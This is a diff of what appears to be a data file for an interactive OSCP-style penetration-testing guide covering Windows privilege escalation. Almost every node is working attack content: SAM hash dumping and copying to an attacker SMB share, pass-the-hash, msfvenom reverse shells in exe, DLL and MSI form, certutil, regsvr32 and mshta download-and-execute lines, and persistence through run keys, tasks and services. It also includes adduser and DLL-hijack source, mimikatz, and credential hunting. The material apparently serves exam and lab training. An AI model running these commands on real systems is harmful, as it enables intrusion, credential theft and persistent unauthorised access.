+# ── SAM DUMP VIA REGISTRY (needs SYSTEM/admin) ──────
+# Save registry hives
+reg save HKLM\\sam sam
+reg save HKLM\\system system
+
+# Transfer to Kali via SMB share:
+# On Kali:
+impacket-smbserver -smb2support kali . -username user -password pass
+# On Windows:
+net use Z: \\\\$LHOST\\\\kali /user:user pass
+copy sam z:
+copy system z:
+
+# Dump hashes on Kali:
+impacket-secretsdump -sam sam -system system local
+
+# Pass the hash:
+impacket-psexec Administrator@$ip -hashes :NTLMHASH
+
+# ── RUNAS WITH FOUND CREDS ───────────────────────────
+# Requires GUI (RDP)
+runas /user:HOSTNAME\\\\targetuser cmd
+runas /user:HOSTNAME\\\\targetuser powershell
+runas /savecred /user:HOSTNAME\\\\targetuser powershell`,
+    warn: "Always re-enumerate after gaining access as a new user. Module 17.1.3 chain: dave -> read asdf.txt -> steve creds -> read my.ini -> backupadmin creds -> local admin. Each new user unlocks new files.",
+    choices: [
+      { label: "Found password — try it on all users/services", next: "creds_found" },
+      { label: "Got new user via runas", next: "windows_post_exploit" },
+      { label: "Check PS history / transcripts", next: "windows_post_exploit" },
+    ],
+  },
+
+  scheduled_tasks_win: {
+    phase: "WINDOWS",
+    title: "Scheduled Tasks Privesc",
+    body: "Find scheduled tasks running as SYSTEM or high-priv user with a script/binary you can modify. Module 17.3: if you can write to the script being executed, you own the next run.",
+    cmd: `# ── ENUMERATE SCHEDULED TASKS ────────────────────────
+# GUI: Task Scheduler
+schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | findstr /i "task name\\|run as\\|task to run\\|status"
+
+# PowerShell — cleaner output
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "*Microsoft*"} | Select TaskName,TaskPath
+Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,LastRunTime,NextRunTime
+
+# ── FIND TASKS RUNNING AS SYSTEM ─────────────────────
+schtasks /query /fo LIST /v | findstr /i "run as"
+# Look for: Run As User: SYSTEM or Administrator
+
+# ── CHECK SCRIPT/BINARY PERMISSIONS ──────────────────
+# Get the script path from the task, then check perms
+icacls "C:\\\\scripts\\\\cleanup.ps1"
+# If you have (W) write access = replace it
+
+# ── REPLACE SCRIPT CONTENT ───────────────────────────
+# Append to the script (safer than replacing)
+echo "net user hacker pass123! /add" >> C:\\\\scripts\\\\cleanup.ps1
+echo "net localgroup administrators hacker /add" >> C:\\\\scripts\\\\cleanup.ps1
+
+# Or replace entirely with reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o task_payload.exe
+# Transfer and place where the task expects it
+
+# ── TRIGGER MANUALLY IF POSSIBLE ────────────────────
+schtasks /run /tn "TaskName"
+
+# ── WAIT FOR SCHEDULED RUN ───────────────────────────
+# Check next run time:
+schtasks /query /tn "TaskName" /fo LIST /v | findstr "Next Run"
+# Set up listener before the scheduled time
+nc -nlvp 443`,
     warn: null,
     choices: [
-      { label: "Got SYSTEM via modified service", next: "got_root_windows" },
+      { label: "Got shell from task execution", next: "got_root_windows" },
+      { label: "Cannot write to script/binary", next: "weak_service" },
     ],
   },
 
   always_install_elevated: {
     phase: "WINDOWS",
     title: "AlwaysInstallElevated",
-    body: "Both registry keys at 1 = MSI files run as SYSTEM. Generate a malicious MSI with msfvenom (standalone, no console needed).",
-    cmd: `# Verify BOTH keys (must be 1)
-reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
-reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+    body: "If both HKCU and HKLM AlwaysInstallElevated keys are set to 1, any user can install MSI packages as SYSTEM. winPEAS flags this automatically.",
+    cmd: `# ── CHECK IF VULNERABLE ──────────────────────────────
+reg query HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated
+reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated
+# Both must be 0x1 to be exploitable
 
-# Generate MSI payload (msfvenom standalone — no MSF console)
-msfvenom -p windows/x64/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT -f msi -o shell.msi
+# PowerUp check
+Get-RegistryAlwaysInstallElevated
 
-# Transfer and execute
-nc -nlvp $LPORT
-msiexec /quiet /qn /i C:\\Windows\\Temp\\shell.msi`,
-    warn: null,
+# ── EXPLOIT ──────────────────────────────────────────
+# Create malicious MSI on Kali
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f msi -o evil.msi
+
+# Transfer to target
+iwr http://$LHOST/evil.msi -OutFile C:\\\\Windows\\\\Temp\\\\evil.msi
+
+# Set up listener on Kali
+nc -nlvp 443
+
+# Install MSI — runs as SYSTEM
+msiexec /quiet /qn /i C:\\\\Windows\\\\Temp\\\\evil.msi
+
+# PowerUp AbuseFunction
+Write-UserAddMSI
+# Creates a .msi that adds current user to Administrators`,
+    warn: "Both HKCU AND HKLM keys must be 0x1 — if only one is set it is not exploitable.",
     choices: [
-      { label: "Got SYSTEM via MSI!", next: "got_root_windows" },
+      { label: "Got SYSTEM shell", next: "got_root_windows" },
     ],
   },
-
-  windows_creds: {
-    phase: "WINDOWS",
-    title: "Windows Credential Hunting",
-    body: "Check everywhere. Module 17.1.3: always re-enumerate after gaining a new user — permissions change and you can read files you couldn't before. Password reuse is extremely common on OSCP boxes.",
-    cmd: `# ── SAVED CREDENTIALS ────────────────────────────────
-cmdkey /list
-runas /savecred /user:admin cmd
-
-# ── REGISTRY PASSWORD HUNT ───────────────────────────
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
-reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
-reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
-
-# ── SAM + SYSTEM DUMP (must be admin) ────────────────
-reg save HKLM\\SAM C:\\Windows\\Temp\\sam
-reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
-# Transfer both to Kali then:
-impacket-secretsdump -sam sam -system system LOCAL
-
-# ── MIMIKATZ ─────────────────────────────────────────
-.\\mimikatz.exe "privilege::debug" \\
-  "token::elevate" \\
-  "sekurlsa::logonpasswords" \\
-  "lsadump::sam" \\
-  "lsadump::cache" \\
-  "exit"
-
-# ── HIDDEN IN PLAIN VIEW (Module 17.1.3) ─────────────
-# Pattern: dave cant read file, steve can, steve finds admin creds
-# Always re-enumerate after gaining a new user
-
-# Search for KeePass databases
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-
-# Search XAMPP config files
-Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
-type C:\\xampp\\passwords.txt
-type C:\\xampp\\mysql\\bin\\my.ini
-
-# Search user home dirs for documents (Module 17 pattern)
-Get-ChildItem -Path C:\\\\Users\\<username>\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
-
-# Specific user (swap dave for actual username)
-Get-ChildItem -Path C:\\\\Users\\dave\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
-
-# All users
-Get-ChildItem -Path C:\\\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
-
-# Broad password file search
-Get-ChildItem -Path C:\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -ErrorAction SilentlyContinue
-
-# cmd-style search
-dir /s /b C:\\Users\\*.xml
-dir /s /b C:\\Users\\*.txt
-dir /s /b C:\\*pass*
-
-# Runas with found password (requires GUI)
-runas /user:HOSTNAME\\targetuser cmd
-
-# ── SESSIONGOPHER ────────────────────────────────────
-# Extracts PuTTY/WinSCP/FileZilla/RDP saved sessions
-iwr http://$LHOST/SessionGopher.ps1 -OutFile C:\\Windows\\Temp\\sg.ps1
-Import-Module .\\sg.ps1
-Invoke-SessionGopher -Thorough
-
-# ── HIVENIGHTMARE CVE-2021-36934 ─────────────────────
-# SAM readable by normal users on unpatched Win10/11
-icacls C:\\Windows\\System32\\config\\SAM
-# If Users group has RX = vulnerable
-vssadmin list shadows
-# Copy from shadow copy and crack:
-impacket-secretsdump -sam sam -system system LOCAL
-
-# ── SHADOW COPIES ────────────────────────────────────
-vssadmin list shadows
-diskshadow list shadows all
-
-# ── WSL ──────────────────────────────────────────────
-wsl whoami
-# If WSL enabled: ubuntu.exe config --default-user root
-
-# ── WIFI PASSWORDS ───────────────────────────────────
-netsh wlan show profiles
-netsh wlan show profile <SSID> key=clear
-
-# ── INTERESTING FILE LOCATIONS ───────────────────────
-type C:\\Windows\\Panther\\Unattend.xml
-type C:\\Windows\\System32\\sysprep\\sysprep.xml
-type C:\\xampp\\phpMyAdmin\\config.inc.php
-Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue | Get-Content`,
-    warn: "Pattern: dave cant read a file, steve can, finds admin creds. ALWAYS re-enumerate after gaining access as a new user. Password reuse is extremely common on OSCP boxes.",
-    choices: [
-      { label: "Found NTLM hash — Pass the Hash", next: "pth" },
-      { label: "Found plaintext creds", next: "creds_found" },
-      { label: "Check DPAPI (browser/credential manager)", next: "dpapi" },
-    ],
-  },
-
-
   pth: {
     phase: "WINDOWS",
     title: "Pass the Hash",
-    body: "NTLM hashes authenticate without cracking. evil-winrm, psexec, wmiexec — all work with hashes directly. nxc/cme confirm which services accept the hash before you connect.",
-    cmd: `# -- Verify hash works first --------------
-nxc smb $ip -u administrator -H <NTLM_HASH>
-nxc winrm $ip -u administrator -H <NTLM_HASH>
-# (Pwn3d!) = local admin confirmed
+    body: "Got NTLM hash but no plaintext password? PTH with impacket tools or CrackMapExec. Requires LocalAccountTokenFilterPolicy=1 for local accounts over network logons.",
+    cmd: `# ── DUMP HASHES FIRST ────────────────────────────────
+# Via SAM (needs SYSTEM)
+reg save HKLM\\sam sam
+reg save HKLM\\system system
+impacket-secretsdump -sam sam -system system local
 
-# -- Connect -------------------------------
-# evil-winrm (WinRM 5985/5986)
-evil-winrm -i $ip -u administrator -H <NTLM_HASH>
+# Via secretsdump remote (needs admin creds)
+impacket-secretsdump administrator:password@$ip
 
-# impacket-psexec — drops binary, noisier
-impacket-psexec domain/administrator@$ip -hashes :NTLM_HASH
+# Via mimikatz
+sekurlsa::logonpasswords
 
-# impacket-wmiexec — stealthier, no binary drop
-impacket-wmiexec domain/administrator@$ip -hashes :NTLM_HASH
+# ── PASS THE HASH ─────────────────────────────────────
+# impacket-psexec
+impacket-psexec Administrator@$ip -hashes :NTLMHASH
 
-# impacket-smbexec
-impacket-smbexec domain/administrator@$ip -hashes :NTLM_HASH
+# impacket-wmiexec
+impacket-wmiexec Administrator@$ip -hashes :NTLMHASH
 
-# -- Spray hash across subnet --------------
-nxc smb $SUBNET/24 -u administrator -H <NTLM_HASH> --continue-on-success`,
-    warn: "nxc (netexec) is the maintained CME successor — same syntax. Use it to confirm (Pwn3d!) before connecting. wmiexec is stealthier than psexec — no binary written to disk.",
+# CrackMapExec
+crackmapexec smb $ip -u Administrator -H NTLMHASH
+crackmapexec smb $ip -u Administrator -H NTLMHASH --exec-method smbexec
+
+# evil-winrm
+evil-winrm -i $ip -u Administrator -H NTLMHASH
+
+# ── LOCALACCOUNTTOKENFILTERPOLICY ─────────────────────
+# If PTH fails for local admin over network:
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy
+# Must be 1 for local accounts to PTH over SMB/WinRM`,
+    warn: "PTH only works with NTLM hashes, not Net-NTLMv2. Net-NTLMv2 must be cracked or relayed — it cannot be passed directly.",
     choices: [
-      { label: "Got admin shell!", next: "got_root_windows" },
+      { label: "Got shell via PTH", next: "got_root_windows" },
+      { label: "Need to crack hash first", next: "hashcrack" },
     ],
   },
 
-
-  windows_manual_enum: {
+  persistence: {
     phase: "WINDOWS",
-    title: "Windows Manual Enumeration",
-    body: "WinPEAS missed something — or you need to understand what it found. Methodical manual enumeration across every category. Check each before concluding nothing is there.",
-    cmd: `# -- SYSTEM BASELINE ----------------------
+    title: "Windows Persistence",
+    body: "Maintain access after reboot. Registry run keys, scheduled tasks, service installation, startup folder. Always document and clean up after the engagement.",
+    cmd: `# ── REGISTRY RUN KEYS ────────────────────────────────
+# HKCU — current user (no admin needed)
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\shell.exe" /f
+
+# HKLM — all users (needs admin)
+reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\shell.exe" /f
+
+# PowerShell
+New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\Windows\\Temp\\shell.exe"
+
+# ── SCHEDULED TASK ────────────────────────────────────
+schtasks /create /tn "Updater" /tr "C:\\Windows\\Temp\\shell.exe" /sc onlogon /ru SYSTEM
+schtasks /create /tn "Updater" /tr "C:\\Windows\\Temp\\shell.exe" /sc minute /mo 5
+
+# ── STARTUP FOLDER ───────────────────────────────────
+# Current user
+copy shell.exe "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+# All users (needs admin)
+copy shell.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+
+# ── SERVICE PERSISTENCE ──────────────────────────────
+sc create Updater binpath= "C:\\Windows\\Temp\\shell.exe" start= auto
+sc start Updater
+
+# ── CLEANUP ──────────────────────────────────────────
+reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /f
+schtasks /delete /tn "Updater" /f
+sc stop Updater && sc delete Updater`,
+    warn: "Always document persistence mechanisms and clean up after the engagement.",
+    choices: [
+      { label: "Back to post-exploit enum", next: "windows_post_exploit" },
+      { label: "Pivot to next machine", next: "pivot_start" },
+    ],
+  },
+
+  lolbins: {
+    phase: "WINDOWS",
+    title: "LOLBins — Living Off The Land",
+    body: "Use Windows built-in binaries to avoid dropping tools. Useful for AV evasion and restricted environments. Reference: lolbas-project.github.io",
+    cmd: `# ── FILE TRANSFER ────────────────────────────────────
+# certutil — download file
+certutil -urlcache -split -f http://$LHOST/shell.exe C:\\Windows\\Temp\\shell.exe
+
+# bitsadmin
+bitsadmin /transfer job http://$LHOST/shell.exe C:\\Windows\\Temp\\shell.exe
+
+# powershell
+(New-Object Net.WebClient).DownloadFile("http://$LHOST/shell.exe","C:\\Windows\\Temp\\shell.exe")
+iwr http://$LHOST/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe
+
+# ── CODE EXECUTION ────────────────────────────────────
+# rundll32
+rundll32 shell32.dll,ShellExec_RunDLL C:\\Windows\\Temp\\shell.exe
+
+# regsvr32 (AppLocker bypass)
+regsvr32 /s /n /u /i:http://$LHOST/shell.sct scrobj.dll
+
+# mshta
+mshta http://$LHOST/shell.hta
+
+# wmic
+wmic process call create "C:\\Windows\\Temp\\shell.exe"
+
+# ── UAC BYPASS ────────────────────────────────────────
+# iscsicpl.exe — auto-elevated, PATH hijack
+# See win_uac_bypass node for full workflow
+
+# ── REFERENCE ─────────────────────────────────────────
+# lolbas-project.github.io — full list with examples
+# GTFOBins Windows equivalent`,
+    warn: null,
+    choices: [
+      { label: "UAC bypass via LOLBin", next: "win_uac_bypass" },
+      { label: "Back to Windows privesc", next: "windows_post_exploit" },
+    ],
+  },
+
+  win_kernel_exploit: {
+    phase: "WINDOWS",
+    title: "Kernel / Application Exploits",
+    body: "Module 17.3.2: missing patches = kernel exploits. Always verify source code is available before running. Kernel exploits can crash systems — test on a clone first. SeImpersonatePrivilege = SigmaPotato is usually safer.",
+    cmd: `# ── ENUMERATE PATCHES / VERSION ──────────────────────
 systeminfo
-whoami /all          # privs, groups, token integrity level
-net user %USERNAME%
-net localgroup administrators
+systeminfo | findstr /i "OS Name\|OS Version\|Build"
 
-# -- SERVICES -----------------------------
-wmic service get name,displayname,startmode,pathname | findstr /v "C:\\Windows"
-Get-WmiObject win32_service | Where PathName -notlike "*Windows*" | select Name,PathName,StartMode
+# Installed security updates
+Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} | Select HotFixID,InstalledOn
 
-# -- SCHEDULED TASKS ----------------------
-schtasks /query /fo LIST /v | findstr /i "task\|run\|next\|status\|as user"
-Get-ScheduledTask | Where TaskPath -notlike "\\Microsoft*" | Select TaskName,Actions
+# ── WES-NG (Windows Exploit Suggester Next Gen) ───────
+# On target:
+systeminfo > C:\\Windows\\Temp\\sysinfo.txt
+# Transfer to Kali then:
+python3 wes.py --update
+python3 wes.py sysinfo.txt
+python3 wes.py sysinfo.txt --impact "Elevation of Privilege"
 
-# -- INSTALLED SOFTWARE --------------------
-wmic product get name,version
-Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion
+# ── CVE-2023-29360 (Win 11 22H2 without KB5027215) ───
+# Already on CLIENTWK220 Desktop as steve in Module 17.3.2
+.\\CVE-2023-29360.exe
+whoami
 
-# -- REGISTRY AUTORUNS ---------------------
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+# ── SEARCHSPLOIT ──────────────────────────────────────
+searchsploit windows 10 privilege escalation
+searchsploit "windows 11" local privilege
 
-# -- NETWORK INTERNALS ---------------------
-netstat -ano
-# Internal ports not in nmap = local-only services
-# Exploitable via port forward
-route print    # other subnets?
-arp -a         # other hosts seen?`,
-    warn: "netstat -ano reveals services listening on 127.0.0.1 that nmap never saw. These are local-only services — pivot to them via port forward. Common finds: internal web panels, DB services, dev servers.",
+# ── APPLICATION-BASED EXPLOITS ────────────────────────
+# Installed apps running as SYSTEM may have vulns
+# Check version with Get-ItemProperty then searchsploit
+Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select DisplayName,DisplayVersion
+Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select DisplayName,DisplayVersion
+
+# ── NOTES ─────────────────────────────────────────────
+# Only use kernel exploits when:
+# 1. Source code is available to review
+# 2. Tested on a clone (can crash system)
+# 3. Rules of engagement allow it
+# SeImpersonatePrivilege -> Potato is safer alternative`,
+    warn: "Kernel exploits can crash the target. Only use when source code is available and rules of engagement allow it. On OSCP — prefer SeImpersonatePrivilege + Potato over kernel exploits.",
     choices: [
-      { label: "Suspicious scheduled task", next: "win_schtask" },
-      { label: "DLL hijack opportunity", next: "win_dll_hijack" },
-      { label: "UAC blocking — need to bypass", next: "win_uac_bypass" },
-      { label: "Internal listening port", next: "pivot_start" },
-      { label: "Nothing — check stored credentials", next: "windows_creds" },
+      { label: "Got SYSTEM", next: "got_root_windows" },
+      { label: "No suitable exploit — try SeImpersonate", next: "token_privs" },
+      { label: "Back to full enum", next: "winpeas" },
     ],
   },
 
-  win_schtask: {
+
+
+  weak_service: {
     phase: "WINDOWS",
-    title: "Scheduled Task Exploitation",
-    body: "A task running as SYSTEM that executes a file you can write is a direct privesc. Three questions: what does it run, can you modify it, when does it trigger?",
-    cmd: `# -- INVESTIGATE THE TASK -----------------
-schtasks /query /fo LIST /v /tn "TaskName"
-# Key fields:
-#   Run As User: SYSTEM        <- privilege you gain
-#   Task To Run: C:\path\exe   <- can you write this file?
-#   Next Run Time:             <- when does it fire?
+    title: "Weak Service Binary Permissions",
+    body: "If Users group has Full Access (F) on a service binary — replace it with a malicious one. Module 17.2.1: enumerate with icacls, replace binary, reboot if needed.",
+    cmd: `# ── STEP 1: FIND VULNERABLE SERVICE BINARIES ─────────
+# List running services with binary paths
+# Note: needs RDP/interactive logon — WinRM gives permission denied
+# sc.exe query for specific service config:
+sc.exe qc <ServiceName>
+sc.exe queryex <ServiceName>
+# Get-CimInstance filter for specific service:
+Get-CimInstance Win32_Service -Filter "Name='mysql'" | Select Name,State,StartName,ProcessId,PathName
+# StartName = which user account runs the service
 
-# -- CHECK WRITE PERMISSIONS --------------
-icacls "C:\path\to\task\binary.exe"
-# Look for: (F) Full  (M) Modify  (W) Write for your user
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}
 
-accesschk.exe /accepteula -wuv "C:\path\to\binary.exe"
+# ── STEP 2: CHECK BINARY PERMISSIONS ─────────────────
+# F = Full access (can replace), RX = Read+Execute only (cannot replace)
+icacls "C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe"
 
-# -- EXPLOIT: REPLACE BINARY --------------
-# Generate payload
-msfvenom -p windows/x64/shell_reverse_tcp \
-  LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
+# PowerUp automated check
+. .\\PowerUp.ps1
+Get-ModifiableServiceFile
 
-# Transfer to target
-certutil -urlcache -split -f http://$LHOST/shell.exe C:\path\to\binary.exe
+# accesschk
+.\\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+.\\accesschk.exe /accepteula -uwcqv "Everyone" *
 
-# Start listener
-nc -nlvp $LPORT
+# ── STEP 3: CREATE MALICIOUS BINARY (on Kali) ─────────
+# C code adds admin user:
+# int main() {
+#   system("net user hacker pass123! /add");
+#   system("net localgroup administrators hacker /add");
+# }
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+# Or reverse shell:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
 
-# Trigger task immediately (if you have rights)
-schtasks /run /tn "TaskName"
-# Otherwise: wait for Next Run Time
+# ── STEP 4: REPLACE THE BINARY ────────────────────────
+# Backup original first!
+move C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe C:\\\\Users\\\\dave\\\\mysqld.exe.bak
 
-# -- EXPLOIT: MODIFY SCRIPT ---------------
-# If task runs .bat or .ps1 you can write:
-echo C:\Windows\Temp\shell.exe >> C:\path\to\task.bat`,
-    warn: "If Next Run Time is hours away: check schtasks /run to force trigger. If denied, set a timer and come back — don't burn time waiting. Move to another machine.",
+# Transfer and place
+iwr http://$LHOST/adduser.exe -OutFile adduser.exe
+move .\\adduser.exe C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe
+
+# ── STEP 5: RESTART SERVICE ───────────────────────────
+# Try manual restart (usually denied)
+net stop mysql
+net start mysql
+
+# Check startup type
+Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like "mysql"}
+
+# Check reboot privilege
+whoami /priv | findstr Shutdown
+
+# Reboot if Auto + SeShutdownPrivilege
+shutdown /r /t 0
+
+# ── STEP 6: VERIFY ────────────────────────────────────
+Get-LocalGroupMember Administrators
+
+# ── STEP 7: RESTORE ───────────────────────────────────
+move C:\\\\Users\\\\dave\\\\mysqld.exe.bak C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe
+shutdown /r /t 0`,
+    warn: "Always backup the original binary before replacing. Note what you changed for the report and restore it. Rebooting can cause unexpected issues — only do it in lab environments.",
     choices: [
-      { label: "Task triggered — SYSTEM shell", next: "got_root_windows" },
-      { label: "Cannot write — try DLL hijack", next: "win_dll_hijack" },
+      { label: "Got admin user — RDP in", next: "got_root_windows" },
+      { label: "Need to build adduser.exe / DLL payload", next: "win_compile" },
+      { label: "Cannot restart or reboot — try DLL hijack", next: "win_dll_hijack" },
     ],
   },
+  win_compile: {
+    phase: "WINDOWS",
+    title: "Windows Payload Compilation (Kali)",
+    body: "Cross-compile Windows binaries and DLLs on Kali with mingw. Module 17.2: adduser.c is the go-to for service binary hijacking, DLL hijacking, scheduled task abuse, and unquoted paths.",
+    cmd: `# ── INSTALL MINGW ────────────────────────────────────
+sudo apt install mingw-w64 -y
+
+# ── ADDUSER.C — add admin user ───────────────────────
+# Save as adduser.c:
+# #include <stdlib.h>
+# int main() {
+#   int i;
+#   i = system("net user dave2 password123! /add");
+#   i = system("net localgroup administrators dave2 /add");
+#   return 0;
+# }
+
+# Compile 64-bit EXE:
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+# Compile 32-bit EXE:
+i686-w64-mingw32-gcc adduser.c -o adduser32.exe
+
+# ── ADDUSER DLL — for DLL hijacking ──────────────────
+# Save as adduser.cpp:
+# #include <stdlib.h>
+# #include <windows.h>
+# BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID reserved) {
+#   switch(reason) {
+#     case DLL_PROCESS_ATTACH:
+#       system("net user dave3 password123! /add");
+#       system("net localgroup administrators dave3 /add");
+#       break;
+#   }
+#   return TRUE;
+# }
+
+# Compile 64-bit DLL:
+x86_64-w64-mingw32-gcc adduser.cpp --shared -o TextShaping.dll
+
+# ── REVERSE SHELL EXE ────────────────────────────────
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -e x86/shikata_ga_nai -o shell_enc.exe
+
+# ── REVERSE SHELL DLL ────────────────────────────────
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f dll -o shell.dll
+
+# ── MSI (AlwaysInstallElevated) ──────────────────────
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f msi -o evil.msi
+
+# ── SERVE AND TRANSFER ───────────────────────────────
+python3 -m http.server 80
+# On Windows:
+iwr http://$LHOST/adduser.exe -OutFile C:\\Windows\\Temp\\adduser.exe
+Unblock-File C:\\Windows\\Temp\\adduser.exe
+
+# ── USE CASES ────────────────────────────────────────
+# Service binary hijacking  -> adduser.exe replaces mysqld.exe
+# DLL hijacking             -> adduser.dll renamed to missing DLL
+# Unquoted service path     -> adduser.exe renamed to Current.exe
+# Scheduled task            -> adduser.exe replaces task binary
+# All of the above          -> same C code, different placement`,
+    warn: null,
+    choices: [
+      { label: "Service binary hijacking", next: "weak_service" },
+      { label: "DLL hijacking", next: "win_dll_hijack" },
+      { label: "Unquoted service path", next: "unquoted_service" },
+      { label: "Scheduled task abuse", next: "scheduled_tasks_win" },
+    ],
+  },
+
+
 
   win_dll_hijack: {
     phase: "WINDOWS",
     title: "DLL Hijacking",
-    body: "Privileged process searches for a DLL in a directory you can write — plant your own. Windows DLL search order is the attack surface. 64-bit process needs 64-bit DLL.",
-    cmd: `# -- FIND CANDIDATES ----------------------
-# Method 1: Procmon filter (if RDP)
-# Filter: Result = NAME NOT FOUND, Path ends .dll
-# Look for: SYSTEM process searching writable directories
-
-# Method 2: Check service directories for write access
-Get-WmiObject win32_service | Where State -eq "Running" | select Name,PathName
-accesschk.exe /accepteula -wud "C:\Program Files\VulnApp\"
-
-# Method 3: PowerSploit
-Find-PathDLLHijack
-Find-ProcessDLLHijack
-
-# DLL search order (simplified):
-# 1. Application directory
+    body: "Module 17.2.2: Service loads a DLL from a writable directory before System32. Plant a malicious DLL with the missing name. Procmon is your tool to find NAME NOT FOUND DLL loads.",
+    cmd: `# ── DLL SEARCH ORDER (Windows) ───────────────────────
+# 1. Application directory  <- check this first
 # 2. System32
 # 3. System (SysWOW64)
 # 4. Windows directory
 # 5. Current directory
-# 6. PATH directories  <- often writable!
+# 6. PATH directories  <- often writable
 
-# -- CHECK PATH FOR WRITABLE DIRS ---------
-# PATH writable check: $env:PATH -split ';' | ForEach { icacls $_ }
+# ── STEP 1: FIND MISSING DLL (Procmon method) ─────────
+# Need GUI/RDP for Procmon
+# 1. Run Procmon64.exe as admin
+# 2. Filter: Process Name = target.exe
+# 3. Filter: Operation = CreateFile
+# 4. Filter: Result = NAME NOT FOUND
+# 5. Filter: Path ends with .dll
+# 6. Look for DLLs loaded from writable directories
 
-# -- CREATE MALICIOUS DLL -----------------
-msfvenom -p windows/x64/shell_reverse_tcp \
-  LHOST=$LHOST LPORT=$LPORT \
-  -f dll -o target.dll
+# ── STEP 2: CONFIRM WRITE ACCESS TO TARGET DIR ────────
+# Test write access:
+echo "test" > "C:\Program Files\VulnApp\test.txt"
+type "C:\Program Files\VulnApp\test.txt"
 
-# -- PLANT AND TRIGGER --------------------
-copy target.dll "C:\writable\path\missing.dll"
-nc -nlvp $LPORT
+# icacls check:
+icacls "C:\Program Files\VulnApp\"
 
-# Restart service
-sc stop VulnService && sc start VulnService`,
-    warn: "msfvenom -f dll defaults to 32-bit. For 64-bit processes use windows/x64/shell_reverse_tcp explicitly. Mismatched architecture = the DLL loads but silently fails.",
+# ── STEP 3: CREATE MALICIOUS DLL (on Kali) ────────────
+# C++ DLL template — runs on DLL_PROCESS_ATTACH
+# #include <stdlib.h>
+# #include <windows.h>
+# BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID reserved) {
+#   switch(reason) {
+#     case DLL_PROCESS_ATTACH:
+#       system("net user hacker pass123! /add");
+#       system("net localgroup administrators hacker /add");
+#       break;
+#   }
+#   return TRUE;
+# }
+
+# Compile as DLL:
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+
